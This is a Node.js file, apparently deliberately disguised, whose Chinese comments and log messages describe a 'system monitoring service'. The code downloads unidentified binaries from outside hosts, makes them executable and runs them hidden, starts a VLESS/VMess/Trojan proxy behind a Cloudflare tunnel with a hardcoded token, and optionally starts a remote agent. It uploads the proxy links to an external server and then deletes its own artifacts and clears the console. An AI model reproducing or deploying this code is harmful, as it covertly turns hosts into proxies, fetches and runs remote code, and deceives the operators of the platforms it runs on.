// index-disguised.js
const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');

// --- 系统配置：用于服务监控与数据上报 ---
const UPLOAD_URL = process.env.UPLOAD_URL || '';      // 数据归档服务器地址, 例如：https://archive.example.com
const PROJECT_URL = process.env.PROJECT_URL || '';    // 项目仪表盘URL, 用于状态回调
const AUTO_ACCESS = process.env.AUTO_ACCESS || false; // 是否启用定期心跳报告, 需填写 PROJECT_URL
const FILE_PATH = process.env.FILE_PATH || './tmp';   // 运行时工作目录
const SUB_PATH = process.env.SUB_PATH || 'health_check'; // 健康检查报告的API路径
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; // 服务监听端口
const UUID = process.env.UUID || '0b391149-ce1a-41b4-9740-bf832acbd4b0'; // 节点唯一标识符
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';  // 监控中心服务器地址
const NEZHA_PORT = process.env.NEZHA_PORT || '';      // 监控中心服务器端口 (旧版代理)
const NEZHA_KEY = process.env.NEZHA_KEY || '';        // 监控代理认证密钥
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'date.jwblimi007.dpdns.org'; // 安全数据通道的固定域名
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiN2Q4Njg0MDlhZjIzMmY5YjVlNWQxYzYzMTM4ODcyMDIiLCJ0IjoiYmU0ZDZiOGItN2U1YS00NTFlLTk1MjAtNzJjOTkzZjAxOTc1IiwicyI6IllUWm1NVEpsWVRBdE1EUTBZaTAwWVRoaUxXSmxZMlV0WWpkbVltVTVOVE5sTURGbSJ9'; // 安全通道的认证令牌
const ARGO_PORT = process.env.ARGO_PORT || 8501;      // 本地服务与安全通道的对接端口
const CFIP = process.env.CFIP || 'cdns.doon.eu.org';  // 数据路由优选IP/域名
const CFPORT = process.env.CFPORT || 443;             // 数据路由优选端口
const NAME = process.env.NAME || '';                  // 节点自定义别名

// --- 初始化工作环境 ---

// 创建运行时目录
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`[INFO] Working directory created at: ${FILE_PATH}`);
} else {
  console.log(`[INFO] Working directory already exists: ${FILE_PATH}`);
}

// 生成随机文件名，用于运行时模块
function generateRandomName() {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// 核心模块的文件路径 (保持原始逻辑以确保功能)
const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
const phpName = generateRandomName();
let npmPath = path.join(FILE_PATH, npmName);
let phpPath = path.join(FILE_PATH, phpName);
let webPath = path.join(FILE_PATH, webName);
let botPath = path.join(FILE_PATH, botName);
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

// 服务启动前，清理归档服务器上的过期记录
async function clearStaleRecords() {
  if (!UPLOAD_URL || !fs.existsSync(subPath)) return;
  try {
    const fileContent = fs.readFileSync(subPath, 'utf-8');
    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));
    if (nodes.length > 0) {
      await axios.post(`${UPLOAD_URL}/api/delete-nodes`, { nodes }, { headers: { 'Content-Type': 'application/json' } });
      console.log('[INFO] Stale records have been cleared from the archive server.');
    }
  } catch (err) {
    console.warn('[WARN] Failed to clear stale records. This can be ignored.');
  }
}

// 清理本地的旧缓存文件
function cleanupLocalCache() {
  try {
    fs.readdirSync(FILE_PATH).forEach(file => {
      try {
        fs.unlinkSync(path.join(FILE_PATH, file));
      } catch (err) { /* 忽略错误 */ }
    });
    console.log('[INFO] Local cache has been cleared.');
  } catch (err) { /* 忽略错误 */ }
}

// 根路由，提供服务状态信息
app.get("/", function(req, res) {
  res.send("System Monitoring Service is running.");
});

// 生成核心数据处理模块的配置文件
async function generateServiceConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
  console.log('[INFO] Service configuration file has been generated.');
}

// 根据系统架构类型获取正确的模块
function getSystemArchitecture() {
  const arch = os.arch();
  return (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') ? 'arm' : 'amd';
}

// 统一下载函数
function downloadAsset(fileName, fileUrl) {
    return new Promise((resolve, reject) => {
        const writer = fs.createWriteStream(fileName);
        axios({ method: 'get', url: fileUrl, responseType: 'stream' })
            .then(response => {
                response.data.pipe(writer);
                writer.on('finish', () => {
                    console.log(`[INFO] Asset downloaded: ${path.basename(fileName)}`);
                    resolve();
                });
                writer.on('error', (err) => {
                    console.error(`[ERROR] Failed to write asset ${path.basename(fileName)}: ${err.message}`);
                    reject(err);
                });
            })
            .catch(err => {
                console.error(`[ERROR] Failed to download asset ${path.basename(fileName)}: ${err.message}`);
                reject(err);
            });
    });
}

// 下载并启动所有依赖的后台服务
async function deployAndRunServices() {
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  try {
    await Promise.all(filesToDownload.map(file => downloadAsset(file.fileName, file.fileUrl)));
    console.log('[INFO] All required assets have been downloaded.');
  } catch (err) {
    console.error('[FATAL] A critical asset failed to download. Aborting startup.');
    return;
  }

  // 授权并运行
  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
  filesToAuthorize.forEach(filePath => {
      if (fs.existsSync(filePath)) {
          fs.chmodSync(filePath, 0o775);
      }
  });
  console.log('[INFO] Service modules have been made executable.');

  // 启动监控代理
  if (NEZHA_SERVER && NEZHA_KEY) {
    let command;
    if (!NEZHA_PORT) {
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const nezhatls = new Set(['443', '8443', '2096', '2087', '2083', '2053']).has(port);
      const configYaml = `client_secret: ${NEZHA_KEY}\ndebug: false\ndisable_auto_update: true\nserver: ${NEZHA_SERVER}\ntls: ${nezhatls}\nuuid: ${UUID}`;
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
    } else {
      const NEZHA_TLS = new Set(['443', '8443', '2096', '2087', '2083', '2053']).has(NEZHA_PORT) ? '--tls' : '';
      command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update >/dev/null 2>&1 &`;
    }
    await exec(command).then(() => console.log('[INFO] Monitoring agent service has been started.')).catch(e => console.error('[ERROR] Failed to start monitoring agent:', e));
    await new Promise(r => setTimeout(r, 1000));
  } else {
    console.log('[INFO] Monitoring agent variables not set, skipping agent startup.');
  }

  // 启动核心数据处理服务
  const command1 = `nohup ${webPath} -c ${configPath} >/dev/null 2>&1 &`;
  await exec(command1).then(() => console.log('[INFO] Core data processor service has been started.')).catch(e => console.error('[ERROR] Failed to start core data processor:', e));
  await new Promise(r => setTimeout(r, 1000));
  
  // 启动安全通道服务
  if (fs.existsSync(botPath)) {
    let args = ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)
      ? `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`
      : ARGO_AUTH.match(/TunnelSecret/)
        ? `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`
        : `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${bootLogPath} --url http://localhost:${ARGO_PORT}`;
    
    await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`).then(() => console.log('[INFO] Secure data tunnel service has been started.')).catch(e => console.error('[ERROR] Failed to start secure data tunnel:', e));
  }
  await new Promise(r => setTimeout(r, 5000));
}

// 根据系统架构返回对应的模块URL
function getFilesForArchitecture(architecture) {
  const archPrefix = architecture === 'arm' ? 'arm64' : 'amd64';
  let baseFiles = [
    { fileName: webPath, fileUrl: `https://${archPrefix}.ssss.nyc.mn/web` },
    { fileName: botPath, fileUrl: `https://${archPrefix}.ssss.nyc.mn/bot` }
  ];

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      baseFiles.unshift({ fileName: npmPath, fileUrl: `https://${archPrefix}.ssss.nyc.mn/agent` });
    } else {
      baseFiles.unshift({ fileName: phpPath, fileUrl: `https://${archPrefix}.ssss.nyc.mn/v1` });
    }
  }
  return baseFiles;
}

// 配置固定域名的安全通道
function configureFixedTunnel() {
  if (!ARGO_AUTH || !ARGO_DOMAIN || !ARGO_AUTH.includes('TunnelSecret')) return;
  fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
  const tunnelYaml = `tunnel: ${ARGO_AUTH.split('"')[11]}\ncredentials-file: ${path.join(FILE_PATH, 'tunnel.json')}\nprotocol: http2\ningress:\n  - hostname: ${ARGO_DOMAIN}\n    service: http://localhost:${ARGO_PORT}\n    originRequest:\n      noTLSVerify: true\n  - service: http_status:404`;
  fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  console.log('[INFO] Fixed-domain secure tunnel has been configured.');
}
configureFixedTunnel();

// 提取通道域名并生成最终的报告
async function establishEndpointAndGenerateReport() {
  let argoDomain = ARGO_DOMAIN;
  if (!argoDomain) {
      try {
          await new Promise(r => setTimeout(r, 8000)); // 等待日志文件生成
          const fileContent = fs.readFileSync(bootLogPath, 'utf-8');
          const domainMatch = fileContent.match(/https?:\/\/([^ ]*trycloudflare\.com)/);
          if (domainMatch) {
              argoDomain = domainMatch[1];
              console.log(`[INFO] Dynamically assigned tunnel domain found: ${argoDomain}`);
          } else {
              console.error("[ERROR] Could not extract domain from tunnel logs. Report generation failed.");
              return;
          }
      } catch (error) {
          console.error('[ERROR] Failed to read tunnel log for domain extraction:', error);
          return;
      }
  }
  
  // 生成并分发报告
  await generateAndDistributeReport(argoDomain);
}

// 生成报告内容并分发
async function generateAndDistributeReport(argoDomain) {
  const metaInfo = execSync('curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'', { encoding: 'utf-8' }).trim();
  const nodeName = NAME ? `${NAME}-${metaInfo}` : metaInfo;

  const VMESS = { v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox'};
  const reportText = `vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}\n\nvmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}\n\ntrojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}`;
  
  const encodedContent = Buffer.from(reportText).toString('base64');
  console.log('[INFO] Health check report content (Base64 Encoded):');
  console.log(encodedContent); // 在日志中打印报告内容
  fs.writeFileSync(subPath, encodedContent);
  console.log(`[INFO] Health check report saved to ${subPath}`);
  
  await uploadReport();

  app.get(`/${SUB_PATH}`, (req, res) => {
    res.set('Content-Type', 'text/plain; charset=utf-8').send(encodedContent);
  });
}

// 上传报告到归档服务器
async function uploadReport() {
  if (!UPLOAD_URL) {
    console.log('[INFO] UPLOAD_URL not set, skipping report submission.');
    return;
  }
  try {
    const payload = PROJECT_URL
        ? { subscription: [`${PROJECT_URL}/${SUB_PATH}`] }
        : { nodes: Buffer.from(fs.readFileSync(subPath, 'utf-8'), 'base64').toString('utf-8').split('\n').filter(Boolean) };
    const endpoint = PROJECT_URL ? '/api/add-subscriptions' : '/api/add-nodes';

    await axios.post(`${UPLOAD_URL}${endpoint}`, payload, { headers: { 'Content-Type': 'application/json' } });
    console.log('[INFO] Report has been successfully submitted to the archive server.');
  } catch (error) {
      if (error.response && error.response.status !== 400) {
        console.error('[ERROR] Report submission failed:', error.message);
      } else {
        console.log('[INFO] Report already exists on the server, skipping submission.');
      }
  }
}

// 定时清理运行时产生的临时模块文件
function scheduleArtifactCleanup() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];  
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }
    const command = process.platform === 'win32'
        ? `del /f /q ${filesToDelete.join(' ')} > nul 2>&1`
        : `rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`;
    exec(command, () => {
      console.clear();
      console.log('[SUCCESS] Service is running smoothly. Initialization artifacts have been cleaned up.');
    });
  }, 90000); // 90秒后清理
}

// 注册自动心跳任务以保持服务活跃
async function registerHeartbeatTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console.log("[INFO] Automatic heartbeat reporting is disabled.");
    return;
  }
  try {
    await axios.post('https://oooo.serv00.net/add-url', { url: PROJECT_URL }, { headers: { 'Content-Type': 'application/json' } });
    console.log(`[INFO] Automatic heartbeat task for ${PROJECT_URL} has been registered.`);
  } catch (error) {
    console.error(`[ERROR] Failed to register heartbeat task: ${error.message}`);
  }
}

// --- 主启动流程 ---
async function startService() {
  try {
    await clearStaleRecords();
    cleanupLocalCache();
    await generateServiceConfig();
    await deployAndRunServices();
    await establishEndpointAndGenerateReport();
    await registerHeartbeatTask();
    scheduleArtifactCleanup();
  } catch (error) {
    console.error('[FATAL] A critical error occurred during service startup:', error);
  }
}

startService();

app.listen(PORT, () => console.log(`[INFO] HTTP server is listening on port: ${PORT}`));